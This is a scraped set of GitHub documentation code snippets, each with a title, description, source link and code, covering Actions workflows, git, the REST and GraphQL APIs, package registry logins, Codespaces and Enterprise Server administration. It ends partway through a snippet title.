YAML\nDESCRIPTION: This example shows how to call a reusable workflow and pass secrets to it using the `secrets` keyword. The `access-token` secret, sourced from `secrets.PERSONAL_ACCESS_TOKEN`, is passed to the `called-workflow.yml` workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_36\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@main\n    secrets:\n      access-token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}\n```\n\n----------------------------------------\n\nTITLE: Checking Git Status After Renormalization\nDESCRIPTION: This snippet displays the rewritten, normalized files after running the `git add --renormalize .` command. It provides insight into the files that have been changed by the normalization process.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit status\n```\n\n----------------------------------------\n\nTITLE: Staging the file movement with git add\nDESCRIPTION: This snippet shows the usage of `git add .` to stage the file movement.  This command deletes the file from its old location and adds it to its new location, preparing the changes for commit. The comment highlights that this command adds the file to the local repository and stages it for commit.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/moving-a-file-to-a-new-location.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git add .\n# Adds the file to your local repository and stages it for commit.\n# {% data reusables.git.unstage-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Opening Codespace in JupyterLab using GitHub CLI\nDESCRIPTION: This command opens a specified codespace in JupyterLab. The `-c` flag specifies the codespace name. JupyterLab must be installed within the codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace jupyter -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring repository and file exclusions\nDESCRIPTION: This YAML snippet demonstrates the syntax for excluding files and directories from GitHub Copilot suggestions. It supports excluding files globally, within specific repositories (identified by various URL formats), and with wildcard patterns. The configuration allows for precise control over which code is used for Copilot's suggestions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configuring-and-auditing-content-exclusion/excluding-content-from-github-copilot.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nREPOSITORY-REFERENCE:\n  - \"/PATH/TO/DIRECTORY/OR/FILE\"\n  - \"/PATH/TO/DIRECTORY/OR/FILE\"\n  - ...\n```\n\n----------------------------------------\n\nTITLE: Receiving Messages from Copilot Platform - Bash\nDESCRIPTION: This code snippet demonstrates how to receive messages from the Copilot platform using a `curl` request. It shows how to send a POST request to the agent's URL with headers for content type, acceptance criteria, and the GitHub token. The request body contains a list of messages from the user, including content and references.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n    --url $AGENT_URL \\\n    --header 'Accept: application/json' \\\n    --header 'Content-Type: application/json' \\\n    --header \"X-GitHub-Token: $RUNTIME_GENERATED_TOKEN\" \\\n    --data '{\n        \"messages\": [\n            {\n                \"role\": \"user\",\n                \"content\": \"What is a closure in javascript?\",\n                \"copilot_references\": []\n            }\n        ]\n    }'\n```\n\n----------------------------------------\n\nTITLE: Creating a New Topic Branch\nDESCRIPTION: This command creates a new branch based on the current `main` branch, allowing for isolated development of specific features or documentation updates. Replace `YOUR-TOPIC-BRANCH` with a descriptive name for the new branch. The `-b` flag creates and switches to the new branch.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit checkout -b YOUR-TOPIC-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Configuring Hex Organization\nDESCRIPTION: This snippet configures access to a Hex organization using the organization name and an authentication key stored as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_8\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  github-hex-org:\n    type: hex-organization\n    organization: github\n    key: ${{secrets.MY_HEX_ORGANIZATION_KEY}}\n```\n\n----------------------------------------\n\nTITLE: Publishing to GPR - Shell Commands\nDESCRIPTION: This shell script creates and configures credentials for GitHub Package Registry, builds the gem using `gem build *.gemspec`, and publishes the gem to GPR using `gem push`. It uses the `GITHUB_TOKEN` secret for authentication and requires the `OWNER` environment variable, which is typically the repository owner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\n{% raw %}mkdir -p $HOME/.gem\ntouch $HOME/.gem/credentials\nchmod 0600 $HOME/.gem/credentials\nprintf -- \"---\\n:github: ${GEM_HOST_API_KEY}\\n\" > $HOME/.gem/credentials\ngem build *.gemspec\ngem push --KEY github --host https://rubygems.pkg.github.com/${OWNER} *.gem{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Updating all GitHub CLI Extensions\nDESCRIPTION: This snippet shows how to update all installed GitHub CLI extensions using the `gh extension upgrade --all` command.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh extension upgrade --all\n```\n\n----------------------------------------\n\nTITLE: Create Azure Web App with Java runtime (Azure CLI)\nDESCRIPTION: This command creates an Azure App Service web app with a specified Java runtime.  It requires the Azure CLI to be installed and configured.  The command takes parameters for the web app name, App Service plan, resource group, and Java runtime version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-java-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"JAVA|11-java11\"\n```\n\n----------------------------------------\n\nTITLE: Specifying Ruby Version\nDESCRIPTION: This YAML snippet shows how to specify a Ruby version using the `ruby/setup-ruby` action. It checks out the code, sets up the specified Ruby version, installs dependencies with `bundle install`, and runs tests with `bundle exec rake`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n  with:\n    ruby-version: '3.1' # Not needed with a .ruby-version file\n- run: bundle install\n- run: bundle exec rake\n```\n\n----------------------------------------\n\nTITLE: Pagination with Octokit.js paginate()\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `octokit.paginate()` method from the Octokit.js library to fetch all issues from a repository. It sets the `owner`, `repo`, and `per_page` options and specifies the GitHub API version. It returns all results as a single array.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",\n{% endif %}});\n\nconst data = await octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"octocat\",\n  repo: \"Spoon-Knife\",\n  per_page: 100,\n  headers: {\n    \"X-GitHub-Api-Version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n\nconsole.log(data)\n```\n\n----------------------------------------\n\nTITLE: Revoking Vault Token using curl (Shell)\nDESCRIPTION: This shell snippet uses `curl` to make a POST request to the Vault API's `revoke-self` endpoint.  It retrieves the Vault token from the `VAULT_TOKEN` environment variable, which is populated by the `hashicorp/vault-action` when `exportToken` is set to `true`.  The `if: always()` condition ensures this step runs regardless of previous steps' success or failure.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -X POST -sv -H \"X-Vault-Token: {% raw %}${{ env.VAULT_TOKEN }}{% endraw %}\" \\\n            VAULT-URL/v1/auth/token/revoke-self\n```\n\n----------------------------------------\n\nTITLE: Get Octocat via curl\nDESCRIPTION: This code snippet demonstrates how to retrieve the Octocat ASCII art from the GitHub REST API using the `curl` command. It specifies the GET method, the API endpoint URL, and required headers for accepting JSON and specifying the API version.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n--url \"https://api.github.com/octocat\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"X-GitHub-Api-Version: 2022-11-28\"\n```\n\n----------------------------------------\n\nTITLE: Importing the Math Module in Python\nDESCRIPTION: This snippet demonstrates how to import the `math` module in Python, which contains various mathematical functions, including the factorial function. Importing the module allows you to use its functions in your code.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_4\n\nLANGUAGE: Python\nCODE:\n```\nimport math\n```\n\n----------------------------------------\n\nTITLE: CodeQL Init with Manual Build Mode (YAML)\nDESCRIPTION: This snippet shows how to initialize CodeQL with `build-mode` set to `manual`.  This configuration requires defining explicit build steps in the workflow, as autobuild is disabled.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n# Initializes the CodeQL tools for scanning.\n- name: Initialize CodeQL\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    languages: {% raw %}${{ matrix.language }}{% endraw %}\n    build-mode: manual\n- uses: {% data reusables.actions.action-codeql-action-analyze %}\n  with:\n    category: {% raw %}\"/language:${{ matrix.language }}\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow Run URL Example\nDESCRIPTION: This snippet demonstrates an example URL format for a GitHub Actions workflow run. The URL points to a specific run within an organization's repository, allowing GitHub Support to quickly access relevant execution details. The specific format differs slightly between GitHub Enterprise Server (GHES) and GitHub.com.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions.md#_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\nhttps://github.com/ORG/REPO/actions/runs/0123456789\n```\n\n----------------------------------------\n\nTITLE: Retrieving Pull Requests with GraphQL\nDESCRIPTION: This GraphQL query retrieves only the `number` and `mergeable` attributes for each pull request. This avoids the excessive data transfer of the REST API approach. The query specifies the repository owner and name, and retrieves the last 10 pull requests.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_4\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n    repository(owner:\"octocat\", name:\"Hello-World\") {\n    pullRequests(last: 10) {\n      edges {\n        node {\n          number\n          mergeable\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Job Execution based on Issue Label - YAML\nDESCRIPTION: This workflow runs when a label is added to an issue, but the `run_if_label_matches` job only executes if the label is named `bug`. It demonstrates conditional execution based on the `github.event.label.name` context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issues:\n    types:\n      - labeled\n\njobs:\n  run_if_label_matches:\n    if: github.event.label.name == 'bug'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'The label was bug'\n```\n\n----------------------------------------\n\nTITLE: Switching Remote URL from HTTPS to SSH\nDESCRIPTION: This snippet demonstrates how to change a remote's URL from HTTPS to SSH using the `git remote set-url` command. The `git remote -v` command is used to verify the change. It assumes the user knows the correct SSH URL for the repository. The process includes listing remotes, changing the URL, and verifying the change.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote set-url origin git@{% data variables.product.product_url %}:OWNER/REPOSITORY.git\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# Verify new remote URL\n> origin  git@{% data variables.product.product_url %}:OWNER/REPOSITORY.git (fetch)\n> origin  git@{% data variables.product.product_url %}:OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Removing Label from Issue/PR (JavaScript)\nDESCRIPTION: This JavaScript code snippet, intended for use within the `actions/github-script` action, extracts the issue or pull request number from the project card's content URL and uses the GitHub API to remove a specific label. It relies on the `context` object provided by the action for accessing event payload and repository information. The workflow requires `issues: write` and `pull-requests: write` permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/removing-a-label-when-a-card-is-added-to-a-project-board-column.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// this gets the number at the end of the content URL, which should be the issue/PR number\nconst issue_num = context.payload.project_card.content_url.split('/').pop()\ngithub.rest.issues.removeLabel({\n  issue_number: issue_num,\n  owner: context.repo.owner,\n  repo: context.repo.repo,\n  name: [\"needs review\"]\n})\n```\n\n----------------------------------------\n\nTITLE: Making Authenticated Requests with OAuth Token\nDESCRIPTION: This Ruby snippet demonstrates how to make authenticated requests to the GitHub API using the obtained access token.  It fetches user information from the `/user` endpoint and private emails from the `/user/emails` endpoint (if the `user:email` scope was granted). It parses JSON responses and passes the result to the 'basic' view. It depends on the 'rest-client' library for making API requests.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# fetch user information\nauth_result = JSON.parse(RestClient.get('{% data variables.product.rest_url %}/user',\n                                        {:params => {:access_token => access_token}}))\n\n# if the user authorized it, fetch private emails\nif has_user_email_scope\n  auth_result['private_emails'] =\n    JSON.parse(RestClient.get('{% data variables.product.rest_url %}/user/emails',\n                              {:params => {:access_token => access_token}}))\nend\n\nerb :basic, :locals => auth_result\n```\n\n----------------------------------------\n\nTITLE: Authenticating Docker with PAT (GHES)\nDESCRIPTION: This command authenticates Docker with the GitHub Packages registry on a GitHub Enterprise Server (GHES) instance, using a personal access token (PAT). It reads the PAT from a file and passes it to Docker via stdin for secure authentication. It includes variations for subdomain isolation enabled and disabled. The username and hostname are required.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncat ~/TOKEN.txt | docker login docker.HOSTNAME -u USERNAME --password-stdin\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncat ~/TOKEN.txt | docker login HOSTNAME -u USERNAME --password-stdin\n```\n\n----------------------------------------\n\nTITLE: Migrating a Single Repository (GHES 3.8+)\nDESCRIPTION: This snippet shows how to migrate a single repository using the `gh gei migrate-repo` command for GitHub Enterprise Server 3.8 or later. It includes parameters for the source and target organizations and repositories, as well as the GHES API URL.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei migrate-repo --github-source-org SOURCE --source-repo CURRENT-NAME --github-target-org DESTINATION --target-repo NEW-NAME --ghes-api-url GHES-API-URL\n```\n\n----------------------------------------\n\nTITLE: Adding Job Summary using Bash\nDESCRIPTION: This bash script adds markdown content to the job summary by appending a string to the `$GITHUB_STEP_SUMMARY` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_42\n\nLANGUAGE: bash\nCODE:\n```\necho \"{markdown content}\" >> $GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Explaining a command with GitHub Copilot CLI\nDESCRIPTION: This snippet demonstrates how to use the `gh copilot explain` command to get an explanation of a given command. It uses `sudo apt-get` as an example. The GitHub Copilot CLI extension must be installed and configured to use this functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/using-github-copilot-in-the-command-line.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh copilot explain \"sudo apt-get\"\n```\n\n----------------------------------------\n\nTITLE: Tailing the GHES Configuration Log\nDESCRIPTION: This command allows monitoring of the configuration run during the upgrade process by displaying the contents of `/data/user/common/ghe-config.log`. The `tail -f` command provides a live view of the log file, enabling real-time progress tracking. Requires SSH access to the GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/upgrading-with-an-upgrade-package.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ntail -f /data/user/common/ghe-config.log\n```\n\n----------------------------------------\n\nTITLE: Login to npm with scope and legacy auth (GHES subdomain)\nDESCRIPTION: This snippet demonstrates how to log in to npm with a specified scope and legacy authentication to the GitHub Packages npm registry using a subdomain isolated GHES instance. The `--auth-type=legacy` flag is required for npm CLI version 9 or greater. Replace `NAMESPACE`, `USERNAME`, and `TOKEN` with your organization or user namespace, GitHub username, and personal access token respectively.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ npm login --scope=@NAMESPACE --auth-type=legacy --registry=https://npm.pkg.github.com/\n\n> Username: USERNAME\n> Password: TOKEN\n```\n\n----------------------------------------\n\nTITLE: Inspecting System SSH Configuration File - Shell\nDESCRIPTION: This command prints the contents of the `/etc/ssh_config` file. This allows you to inspect system-wide SSH configurations that may override user-specific settings.  The example shows how `ForwardAgent no` in this file can disable agent forwarding.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ cat /etc/ssh_config\n# Print out the /etc/ssh_config file\n> Host *\n>   SendEnv LANG LC_*\n>   ForwardAgent no\n```\n\n----------------------------------------\n\nTITLE: Defining PostgreSQL Service Container (Runner Jobs) - YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that includes a PostgreSQL service container for jobs running directly on the runner machine. The `runner-job` runs on `ubuntu-latest`. It defines a `postgres` service, specifies the Docker Hub image, sets the PostgreSQL password, defines health check options, and maps port 5432 on the service container to port 5432 on the host, enabling access via `localhost`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nname: PostgreSQL Service Example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data\n        run: node client.js\n        # Environment variables used by the `client.js` script to create\n        # a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: localhost\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Setting Repository URL in package.json (Shell)\nDESCRIPTION: This snippet configures the `repository` field in `package.json` to link multiple packages to the same GitHub repository. It uses conditional logic based on the GitHub version (FPT/GHEC or others) to determine the correct GitHub URL.  The 'OWNER' and 'REPOSITORY' placeholders must be replaced with the correct values.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n\"repository\":\"https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY\",\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Job Syntax\nDESCRIPTION: This YAML snippet shows the syntax for defining a job in GitHub Actions. It includes a checkout action and a run step that executes a shell command. The `actions/checkout` action is used to checkout the repository, and the `run` step executes an echo command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - run: echo \"Run your script here\"\n```\n\n----------------------------------------\n\nTITLE: SSH into {% data variables.location.product_location %}\nDESCRIPTION: This shell command is used to establish an SSH connection to the administrative shell of a {% data variables.location.product_location %} instance. Replace `HOSTNAME` with the actual hostname or IP address of the instance or a node in a cluster. The connection is made using port 122 and the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/ssh-into-instance.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Fetching Repository Issues with Octokit.js\nDESCRIPTION: This JavaScript snippet uses Octokit.js to fetch a list of issues from a GitHub repository. The 'owner' and 'repo' parameters specify the repository to query. Ensure the authenticated user has permissions to read the issues.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nawait octokit.request(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"{% ifversion ghes %}REPO-OWNER{% else %}octocat{% endif %}\",\n  repo: \"{% ifversion ghes %}REPO-NAME{% else %}Spoon-Knife{% endif %}\",\n});\n```\n\n----------------------------------------\n\nTITLE: Pulling Docker Image from GitHub Packages (GHES, Subdomain Isolation Enabled)\nDESCRIPTION: This snippet shows how to pull a Docker image from GitHub Packages when using GitHub Enterprise Server with subdomain isolation enabled.  It requires Docker to be installed and configured. Replace HOSTNAME, OWNER, REPOSITORY, IMAGE_NAME, and TAG_NAME with the appropriate values for your image.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ndocker pull docker.HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:TAG_NAME\n```\n\n----------------------------------------\n\nTITLE: Displaying a Git Object\nDESCRIPTION: This command attempts to display a specific Git object (commit) using its SHA-1 hash. It's used to verify if the object exists in the local repository. If the object is not found, Git will return a 'fatal: bad object' error. The input is the SHA-1 hash of the commit. The expected output is the commit details, or an error if not found.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/troubleshooting-commits/commit-exists-on-github-but-not-in-my-local-clone.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git show 1095ff3d0153115e75b7bca2c09e5136845b5592\n> fatal: bad object 1095ff3d0153115e75b7bca2c09e5136845b5592\n```\n\n----------------------------------------\n\nTITLE: Managing Maintenance Mode via SSH with ghe-cluster-maintenance\nDESCRIPTION: This snippet demonstrates how to use the `ghe-cluster-maintenance` command-line utility via SSH to manage maintenance mode for every node in a GitHub Enterprise Server cluster. It includes options for querying the current mode, setting maintenance mode with or without a custom message, updating the custom message, and unsetting maintenance mode.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/configuring-maintenance-mode/enabling-and-scheduling-maintenance-mode.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-cluster-maintenance -h\n# Shows options\n$ ghe-cluster-maintenance -q\n# Queries the current mode\n$ ghe-cluster-maintenance -s\n# Sets maintenance mode\n$ ghe-cluster-maintenance -s \"MESSAGE\"\n# Sets maintenance mode with a custom message\n$ ghe-cluster-maintenance -m \"MESSAGE\"\n# Updates the custom message\n$ ghe-cluster-maintenance -u\n# Unsets maintenance mode\n```\n\n----------------------------------------\n\nTITLE: Declaring Outputs for Docker/JS Actions in YAML\nDESCRIPTION: This example demonstrates how to declare an output parameter for a Docker container or JavaScript action using YAML.  It defines an output named `sum` with a description.  Outputs declared in the metadata file can be used by subsequent actions in a workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\noutputs:\n  sum: # id of the output\n    description: 'The sum of the inputs'\n```\n\n----------------------------------------\n\nTITLE: Installing Chocolatey packages on Windows runners\nDESCRIPTION: This snippet demonstrates how to install a package using Chocolatey on a Windows runner in a GitHub Actions workflow. It installs the `gh` CLI using `choco install gh` and then verifies the installation by running `gh version`. The workflow is triggered on `push` events.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-github-hosted-runners/customizing-github-hosted-runners.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build on Windows\non: push\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: choco install gh\n      - run: gh version\n```\n\n----------------------------------------\n\nTITLE: Committing staged file with git\nDESCRIPTION: This command commits the tracked changes that have been staged and prepares them to be pushed to a remote repository.  The `-m` flag allows for specifying a commit message directly in the command.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/adding-a-file-to-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Add existing file\"\n# Commits the tracked changes and prepares them to be pushed to a remote repository. {% data reusables.git.reset-head-to-previous-commit-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Catching All Errors Using Try/Catch\nDESCRIPTION: This example demonstrates how to use a try/catch block to handle errors when fetching paginated files from a pull request using the Octokit.js library.  It logs the error status and message if an error occurs during the API request or pagination process.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nlet filesChanged = []\n\ntry {\n  const iterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/pulls/{pull_number}/files\", {\n    owner: \"github\",\n    repo: \"docs\",\n    pull_number: 22809,\n    per_page: 100,\n    headers: {\n      \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n    },\n  });\n\n  for await (const {data} of iterator) {\n    filesChanged = [...filesChanged, ...data.map(fileData => fileData.filename)];\n  }\n} catch (error) {\n  if (error.response) {\n    console.error(`Error! Status: ${error.response.status}. Message: ${error.response.data.message}`)\n  }\n  console.error(error)\n}\n```\n\n----------------------------------------\n\nTITLE: Forwarding ports in devcontainer.json for C# (.NET)\nDESCRIPTION: This code snippet shows how to forward port 5000 in the `devcontainer.json` file, allowing access to the application running in the codespace from the local machine.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-dotnet-project-for-codespaces.md#_snippet_2\n\nLANGUAGE: JSONC\nCODE:\n```\n   // Use 'forwardPorts' to make a list of ports inside the container available locally.\n   \"forwardPorts\": [5000],\n```\n\n----------------------------------------\n\nTITLE: Initializing Dind Rootless Environment - Shell\nDESCRIPTION: This init container prepares a rootless Docker-in-Docker (Dind) environment.  It copies files to the /dind-etc directory, creates user and group entries, sets permissions, and changes ownership of the /dind-home directory. This setup is crucial for running Docker commands inside a container without root privileges.  A volume mount is required to persist changes to /dind-etc and /dind-home.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_28\n\nLANGUAGE: Shell\nCODE:\n```\nset -x\ncp -a /etc/. /dind-etc/\necho 'runner:x:1001:1001:runner:/home/runner:/bin/ash' >> /dind-etc/passwd\necho 'runner:x:1001:' >> /dind-etc/group\necho 'runner:100000:65536' >> /dind-etc/subgid\necho 'runner:100000:65536' >> /dind-etc/subuid\nchmod 755 /dind-etc;\nchmod u=rwx,g=rx+s,o=rx /dind-home\nchown 1001:1001 /dind-home\n```\n\n----------------------------------------\n\nTITLE: Setting OIDC Audience as Environment Variable\nDESCRIPTION: This YAML snippet shows how to set the OIDC audience as an environment variable in a GitHub Actions workflow. The `OIDC_AUDIENCE` environment variable is defined at the job level and can be accessed by subsequent steps within the workflow. Replace `YOUR_AUDIENCE` with the intended audience value.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    env:\n      OIDC_AUDIENCE: 'YOUR_AUDIENCE'\n```\n\n----------------------------------------\n\nTITLE: Deleting Credentials via Command Line 